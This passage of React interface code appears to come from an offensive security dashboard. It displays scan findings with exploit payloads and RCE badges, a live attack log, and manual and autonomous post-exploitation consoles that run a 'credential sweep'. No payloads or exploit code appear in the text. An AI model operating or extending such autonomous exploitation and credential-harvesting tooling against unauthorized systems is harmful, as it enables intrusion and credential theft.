                        { label: "High",     value: chainScans.flatMap(s=>s.findings??[]).filter(f=>f.severity==="high"&&f.bypassed).length,     color: "text-orange-400" },
                        { label: "Confirmed",value: confirmedFindings.length, color: confirmedFindings.length > 0 ? "text-red-400" : "text-green-500" },
                        { label: "Findings", value: allFindings.length,       color: "text-gray-300" },
                      ].map(s => (
                        <div key={s.label} className="bg-gray-800 rounded p-2 text-center">
                          <div className={`text-lg font-bold ${s.color}`}>{s.value}</div>
                          <div className="text-[10px] text-gray-500">{s.label}</div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}

              {/* Single-scan stats */}
              {orchMode !== "chain" && displayScan && (
                <div className="bg-gray-900 border border-gray-800 rounded-lg p-4">
                  <div className="flex flex-wrap items-center gap-3 mb-3">
                    <span className="text-sm font-mono text-white truncate max-w-[250px]">{displayScan.target}</span>
                    <div className={`px-2 py-0.5 rounded text-xs font-medium ${isRunning ? "bg-yellow-900 text-yellow-300" : displayScan.status === "completed" ? "bg-green-900 text-green-300" : "bg-gray-700 text-gray-300"}`}>
                      {isRunning && <RefreshCw className="h-3 w-3 inline mr-1 animate-spin" />}{displayScan.status}
                    </div>
                    <div className="ml-auto flex gap-2">
                      {canGetSession && !showDesktop && (
                        <Button onClick={() => loadSession(displayScan.id)} size="sm" className="bg-red-800 hover:bg-red-700 text-sm">
                          <Terminal className="h-3 w-3 mr-1" /> Open Console
                        </Button>
                      )}
                      {showDesktop && (
                        <Button onClick={() => setShowDesktop(false)} size="sm" variant="outline" className="border-gray-600 text-gray-300 text-xs">
                          Hide Console
                        </Button>
                      )}
                      {!isRunning && (
                        <Button onClick={exportReport} size="sm" variant="outline" className="border-gray-600 text-gray-300 text-xs">
                          <Download className="h-3 w-3 mr-1" /> Report
                        </Button>
                      )}
                    </div>
                  </div>
                  <div className="grid grid-cols-4 gap-3">
                    {[
                      { label: "Critical", value: stats?.critical ?? 0, color: "text-red-400" },
                      { label: "High",     value: stats?.high ?? 0,     color: "text-orange-400" },
                      { label: "Medium",   value: stats?.medium ?? 0,   color: "text-yellow-400" },
                      { label: "Bypass%",  value: `${displayScan.successRate ?? 0}%`, color: (displayScan.successRate ?? 0) >= 50 ? "text-red-400" : "text-green-400" },
                    ].map(s => (
                      <div key={s.label} className="bg-gray-800 rounded p-2 text-center">
                        <div className={`text-xl font-bold ${s.color}`}>{s.value}</div>
                        <div className="text-xs text-gray-400">{s.label}</div>
                      </div>
                    ))}
                  </div>
                  {stats && <div className="mt-2 text-xs text-gray-400">Tests: {stats.tested} | Findings: {allFindings.length} | Confirmed: {confirmedFindings.length}</div>}
                </div>
              )}

              {/* Chain export button */}
              {orchMode === "chain" && chainScans.length > 0 && !chainRunning && (
                <div className="flex gap-2">
                  {(sessionData || displayScan?.session) && !showDesktop && (
                    <Button onClick={() => { if (displayScan) loadSession(displayScan.id); else setShowDesktop(true); }}
                      size="sm" className="bg-red-800 hover:bg-red-700">
                      <Terminal className="h-3 w-3 mr-1" /> Open Console
                    </Button>
                  )}
                  {showDesktop && (
                    <Button onClick={() => setShowDesktop(false)} size="sm" variant="outline" className="border-gray-600 text-gray-300 text-xs">
                      Hide Console
                    </Button>
                  )}
                  <Button onClick={exportReport} size="sm" variant="outline" className="border-gray-600 text-gray-300 text-xs ml-auto">
                    <Download className="h-3 w-3 mr-1" /> Full Chain Report
                  </Button>
                </div>
              )}

              {/* Findings */}
              {allFindings.length > 0 && (
                <div className="bg-gray-900 border border-gray-800 rounded-lg p-4">
                  <h3 className="text-sm font-semibold text-gray-300 uppercase tracking-wider mb-3">
                    Findings ({allFindings.length}) — {confirmedFindings.length} exploitable
                  </h3>
                  <div className="space-y-2 max-h-[380px] overflow-y-auto pr-1">
                    {allFindings.map((f, i) => (
                      <div key={i} className={`bg-gray-800 border rounded-lg overflow-hidden ${f.bypassed ? "border-red-900/50" : "border-gray-700"}`}>
                        <button className="w-full flex items-center gap-2 p-3 text-left hover:bg-gray-750"
                          onClick={() => setExpandedFindings(prev => { const s = new Set(prev); s.has(i) ? s.delete(i) : s.add(i); return s; })}>
                          {SEV_ICON[f.severity]}
                          <Badge className={`text-xs shrink-0 ${SEV_COLORS[f.severity]}`}>{f.severity}</Badge>
                          <span className="text-sm font-medium text-white flex-1 truncate">{f.category} — {f.technique}</span>
                          {f.canExec && <Badge className="text-xs bg-red-800 text-red-200 shrink-0">RCE</Badge>}
                          {f.canRead && !f.canExec && <Badge className="text-xs bg-orange-800 text-orange-200 shrink-0">READ</Badge>}
                          {f.bypassed ? <span className="text-xs text-red-400 shrink-0">CONFIRMED</span> : <span className="text-xs text-gray-500 shrink-0">info</span>}
                          {expandedFindings.has(i) ? <ChevronUp className="h-4 w-4 text-gray-400 shrink-0" /> : <ChevronDown className="h-4 w-4 text-gray-400 shrink-0" />}
                        </button>
                        {expandedFindings.has(i) && (
                          <div className="border-t border-gray-700 p-3 space-y-2 text-xs bg-gray-850">
                            <div><span className="text-gray-400">URL: </span><span className="font-mono text-blue-300 break-all">{f.url}</span></div>
                            <div><span className="text-gray-400">Param: </span><span className="font-mono text-cyan-300">?{f.param}</span></div>
                            <div className="bg-black rounded p-2">
                              <span className="text-gray-500">Payload: </span>
                              <span className="font-mono text-red-300 break-all">{f.payload}</span>
                              <button onClick={() => navigator.clipboard.writeText(f.payload)} className="ml-2 text-gray-600 hover:text-gray-400">
                                <Copy className="h-3 w-3 inline" />
                              </button>
                            </div>
                            <div><span className="text-gray-400">Evidence: </span><span className="text-gray-200 break-all whitespace-pre-wrap">{f.evidence.substring(0, 300)}</span></div>
                            <div className="flex gap-3">
                              <span className="text-gray-500">HTTP {f.statusCode}</span>
                              <span className="text-gray-500">{f.responseTime}ms</span>
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Live log */}
              {displayScan && (
                <div className="bg-gray-900 border border-gray-800 rounded-lg p-4">
                  <button className="flex items-center gap-2 text-sm font-semibold text-gray-300 uppercase tracking-wider mb-3 w-full text-left"
                    onClick={() => setShowLog(p => !p)}>
                    {showLog ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
                    Live Attack Log ({displayScan.log?.length ?? 0} lines)
                    {orchMode === "chain" && chainScans.length > 1 && (
                      <span className="text-xs text-gray-500 font-normal">— showing most recent phase</span>
                    )}
                  </button>
                  {showLog && (
                    <div ref={logRef} className="bg-black rounded p-3 font-mono text-xs max-h-[280px] overflow-y-auto whitespace-pre-wrap">
                      {(displayScan.log ?? []).length === 0 ? <span className="text-gray-600">Initializing...</span> :
                        displayScan.log.map((line, i) => (
                          <div key={i} className={
                            line.includes("🔴") ? "text-red-400" :
                            line.includes("🟡") ? "text-yellow-400" :
                            line.includes("✅") ? "text-green-400" :
                            line.includes("🚀") || line.includes("🏁") || line.includes("═") ? "text-blue-400" :
                            line.includes("⚛") ? "text-purple-400" :
                            "text-green-400"
                          }>{line}</div>
                        ))
                      }
                      {isRunning && <span className="animate-pulse text-green-400">█</span>}
                    </div>
                  )}
                </div>
              )}

              {!displayScan && !chainRunning && phaseStatuses.length === 0 && (
                <div className="bg-gray-900 border border-gray-800 rounded-lg p-12 text-center">
                  <Layers className="h-12 w-12 text-gray-700 mx-auto mb-3" />
                  <p className="text-gray-400">
                    {orchMode === "chain"
                      ? "Configure target and phases, then run the attack chain"
                      : orchMode === "salvo"
                      ? "Select modules and fire the full salvo"
                      : "Build your custom attack sequence and launch"}
                  </p>
                  <p className="text-gray-600 text-sm mt-2">Only test systems you own or have written authorization to test</p>
                </div>
              )}
            </div>
          </div>

          {/* ── Post-Exploitation: autonomous console ───────────────── */}
          {breachState === "autonomous" && breachSession && (
            <div>
              <h2 className="text-lg font-bold text-amber-400 mb-3 flex items-center gap-2">
                <Bot className="h-5 w-5 animate-pulse" /> Autonomous Post-Exploitation Operator
                <span className="text-sm text-gray-400 font-normal ml-2">— credential sweep in progress</span>
              </h2>
              <AutonomousConsole
                session={breachSession}
                log={autonomousLog}
                running={autonomousRunning}
                paused={autonomousPaused}
                onTakeControl={takeControlFromAuto}
                onTogglePause={toggleAutoPause}
              />
            </div>
          )}

          {/* ── Post-Exploitation: manual console ───────────────────── */}
          {(breachState === "manual" || (showDesktop && breachState === "idle")) && sessionData && displayScan && (
            <div>
              <div className="flex items-center gap-3 mb-3">
                <h2 className="text-lg font-bold text-red-400 flex items-center gap-2">
                  <Terminal className="h-5 w-5" /> Post-Exploitation Console
                  <span className="text-sm text-gray-400 font-normal ml-2">— Live access via confirmed exploit</span>
                </h2>
                {breachState === "manual" && (
                  <button onClick={() => { setBreachState("autonomous"); if (breachSession) runAutonomous(breachSession); }}
                    className="ml-auto flex items-center gap-1.5 px-3 py-1 rounded-lg text-xs font-bold border border-amber-700 text-amber-400 hover:bg-amber-900/30 transition-colors">
                    <Bot className="h-3.5 w-3.5" /> Switch to Autonomous
                  </button>
                )}
              </div>
              <ExploitDesktop scanId={displayScan.id} session={sessionData} />
            </div>
          )}
        </div>
      )}

      {mainTab === "history" && (
        <div className="space-y-3">
          {scans.length === 0 ? (
            <div className="bg-gray-900 border border-gray-800 rounded-lg p-12 text-center text-gray-400">No scans yet</div>
          ) : scans.map(scan => (
            <div key={scan.id} className="bg-gray-900 border border-gray-800 rounded-lg p-4 flex items-center gap-4">
              <div className="flex-1 min-w-0">
                <div className="font-mono text-sm text-white truncate">{scan.target}</div>
                <div className="text-xs text-gray-400 mt-0.5 flex gap-3">
                  <span>{new Date(scan.startedAt).toLocaleString()}</span>
                  <span>{(scan.findings as any[])?.length ?? 0} findings</span>
                  {scan.successRate != null && <span className={scan.successRate >= 50 ? "text-red-400" : "text-green-400"}>{scan.successRate}% bypass</span>}
                </div>
              </div>
              <div className={`px-2 py-0.5 rounded text-xs font-medium ${scan.status === "running" ? "bg-yellow-900 text-yellow-300" : scan.status === "completed" ? "bg-green-900 text-green-300" : "bg-gray-700 text-gray-300"}`}>
                {scan.status}
              </div>
              <div className="flex gap-2">
                <Button size="sm" variant="outline" className="border-gray-600 text-gray-300 text-xs" onClick={() => loadScan(scan.id)}>View</Button>
                <Button size="sm" variant="ghost" className="text-gray-500 hover:text-red-400 px-2" onClick={() => deleteScan(scan.id)}>
                  <Trash2 className="h-4 w-4" />
                </Button>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
